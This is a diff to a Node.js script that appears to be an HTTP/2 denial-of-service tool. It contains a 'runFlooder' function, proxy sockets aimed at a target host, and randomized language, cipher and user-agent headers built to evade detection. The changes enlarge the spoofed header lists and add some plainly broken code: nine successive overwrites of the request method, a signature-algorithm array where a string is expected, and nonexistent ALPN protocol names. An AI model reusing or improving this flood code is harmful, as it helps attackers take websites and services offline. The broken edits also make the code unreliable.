@@ -6,8 +6,103 @@ const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 
-lang_header = ['pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7', 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6', 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7', 'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7', 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',   'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
-'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',],
+language_header = [
+    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
+    'en-US,en;q=0.5',
+    'en-US,en;q=0.9',
+    'de-CH;q=0.7',
+    'da, en-gb;q=0.8, en;q=0.7',
+    'cs;q=0.5',
+    'nl-NL,nl;q=0.9',
+    'nn-NO,nn;q=0.9',
+    'or-IN,or;q=0.9',
+    'pa-IN,pa;q=0.9',
+    'pl-PL,pl;q=0.9',
+    'pt-BR,pt;q=0.9',
+    'pt-PT,pt;q=0.9',
+    'ro-RO,ro;q=0.9',
+    'ru-RU,ru;q=0.9',
+    'si-LK,si;q=0.9',
+    'sk-SK,sk;q=0.9',
+    'sl-SI,sl;q=0.9',
+    'sq-AL,sq;q=0.9',
+    'sr-Cyrl-RS,sr;q=0.9',
+    'sr-Latn-RS,sr;q=0.9',
+    'sv-SE,sv;q=0.9',
+    'sw-KE,sw;q=0.9',
+    'ta-IN,ta;q=0.9',
+    'te-IN,te;q=0.9',
+    'th-TH,th;q=0.9',
+    'tr-TR,tr;q=0.9',
+    'uk-UA,uk;q=0.9',
+    'ur-PK,ur;q=0.9',
+    'uz-Latn-UZ,uz;q=0.9',
+    'vi-VN,vi;q=0.9',
+    'zh-CN,zh;q=0.9',
+    'zh-HK,zh;q=0.9',
+    'zh-TW,zh;q=0.9',
+    'am-ET,am;q=0.8',
+    'as-IN,as;q=0.8',
+    'az-Cyrl-AZ,az;q=0.8',
+    'bn-BD,bn;q=0.8',
+    'bs-Cyrl-BA,bs;q=0.8',
+    'bs-Latn-BA,bs;q=0.8',
+    'dz-BT,dz;q=0.8',
+    'fil-PH,fil;q=0.8',
+    'fr-CA,fr;q=0.8',
+    'fr-CH,fr;q=0.8',
+    'fr-BE,fr;q=0.8',
+    'fr-LU,fr;q=0.8',
+    'gsw-CH,gsw;q=0.8',
+    'ha-Latn-NG,ha;q=0.8',
+    'hr-BA,hr;q=0.8',
+    'ig-NG,ig;q=0.8',
+    'ii-CN,ii;q=0.8',
+    'is-IS,is;q=0.8',
+    'jv-Latn-ID,jv;q=0.8',
+    'ka-GE,ka;q=0.8',
+    'kkj-CM,kkj;q=0.8',
+    'kl-GL,kl;q=0.8',
+    'km-KH,km;q=0.8',
+    'kok-IN,kok;q=0.8',
+    'ks-Arab-IN,ks;q=0.8',
+    'lb-LU,lb;q=0.8',
+    'ln-CG,ln;q=0.8',
+    'mn-Mong-CN,mn;q=0.8',
+    'mr-MN,mr;q=0.8',
+    'ms-BN,ms;q=0.8',
+    'mt-MT,mt;q=0.8',
+    'mua-CM,mua;q=0.8',
+    'nds-DE,nds;q=0.8',
+    'ne-IN,ne;q=0.8',
+    'nso-ZA,nso;q=0.8',
+    'oc-FR,oc;q=0.8',
+    'pa-Arab-PK,pa;q=0.8',
+    'ps-AF,ps;q=0.8',
+    'quz-BO,quz;q=0.8',
+    'quz-EC,quz;q=0.8',
+    'quz-PE,quz;q=0.8',
+    'rm-CH,rm;q=0.8',
+    'rw-RW,rw;q=0.8',
+    'sd-Arab-PK,sd;q=0.8',
+    'se-NO,se;q=0.8',
+    'si-LK,si;q=0.8',
+    'smn-FI,smn;q=0.8',
+    'sms-FI,sms;q=0.8',
+    'syr-SY,syr;q=0.8',
+    'tg-Cyrl-TJ,tg;q=0.8',
+    'ti-ER,ti;q=0.8',
+    'tk-TM,tk;q=0.8',
+    'tn-ZA,tn;q=0.8',
+    'ug-CN,ug;q=0.8',
+    'uz-Cyrl-UZ,uz;q=0.8',
+    've-ZA,ve;q=0.8',
+    'wo-SN,wo;q=0.8',
+    'xh-ZA,xh;q=0.8',
+    'yo-NG,yo;q=0.8',
+    'zgh-MA,zgh;q=0.8',
+    'zu-ZA,zu;q=0.8',
+  ],
 encoding_header = [
 'gzip, deflate, br',
 'compress, gzip',
@@ -66,7 +161,16 @@ const ciphers = "GREASE:" + [
     ...defaultCiphers.slice(3)
 ].join(":");
 
-const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
+const sigalgs = [
+     "ecdsa_secp256r1_sha256",
+          "rsa_pss_rsae_sha256",
+          "rsa_pkcs1_sha256",
+          "ecdsa_secp384r1_sha384",
+          "rsa_pss_rsae_sha384",
+          "rsa_pkcs1_sha384",
+          "rsa_pss_rsae_sha512",
+          "rsa_pkcs1_sha512"
+]
 
 const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
 
@@ -134,7 +238,6 @@ const nullHexs = [
         "HEAD",
         "DELETE",
         "PUT",
-        "DELETE",
         "CONNECT",
         "OPTIONS",
         "TRACE",
@@ -292,6 +395,14 @@ function getRandomUserAgent() {
 
 const Header = new NetSocket();
 headers[":method"] = "GET";
+headers[":method"] = "POST";
+headers[":method"] = "HEAD";
+headers[":method"] = "DELETE";
+headers[":method"] = "PUT";
+headers[":method"] = "CONNECT";
+headers[":method"] = "OPTIONS";
+headers[":method"] = "TRACE";
+headers[":method"] = "PATCH";
 headers[":path"] = parsedTarget.path
 headers[":scheme"] = "https";
 headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
@@ -359,7 +470,7 @@ function runFlooder() {
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
-           ALPNProtocols: ['h2', 'http/1.1'],
+           ALPNProtocols: ['h2', 'http/1.1', 'http/2', 'http/1.2', 'http/1'],
        socket: connection,
        honorCipherOrder: true,
            uri: parsedTarget.host,
